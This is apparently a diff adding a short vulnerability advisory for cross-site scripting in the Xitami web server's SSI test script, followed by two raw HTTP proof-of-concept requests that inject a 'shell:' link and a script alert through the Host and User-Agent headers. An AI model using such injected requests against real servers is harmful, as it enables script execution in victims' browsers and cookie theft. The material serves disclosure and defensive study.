@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/10778/info
+
+It is reported that Imatix Xitami is affected by a cross-site scripting vulnerability in the server side includes test script. This issue is due to a failure of the application to properly sanitize user-supplied input.
+
+Successful exploitation of this issue will allow an attacker to execute arbitrary script code in the browser of an unsuspecting user. This may potentially be exploited to hijack web content or steal cookie-based authentication credentials from legitimate users.
+
+Telnet (dont netcat!) to port 80:
+
+GET /testssi.ssi HTTP/1.1
+Host: localhost
+User-Agent: <A HREF="shell:windows\system32\calc.exe">PLEASE CLICK HERE</A>
+Connection: close
+
+GET /testssi.ssi HTTP/1.1
+Host: <script>alert("Please click at \"PLEASE CLICK HERE\"")</script>
+User-Agent: <A HREF="shell:windows\system32\calc.exe">PLEASE CLICK HERE</A>
+Connection: close
